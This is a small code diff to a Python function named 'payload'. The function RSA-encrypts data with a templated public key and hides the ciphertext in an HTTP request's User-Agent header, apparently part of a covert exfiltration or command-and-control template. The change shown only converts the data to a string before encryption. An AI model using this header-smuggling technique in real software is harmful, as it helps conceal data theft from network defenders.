@@ -5,7 +5,7 @@ from rsa import PublicKey
 def payload(data):
     # Encrypt data
     publicKey = {{publicKey}}
-    data = rsa.encrypt(data.encode(), publicKey).hex()
+    data = rsa.encrypt(str(data).encode(), publicKey).hex()
     headers = {
     "Accept": "{{postKey}}",
     "User-Agent": data
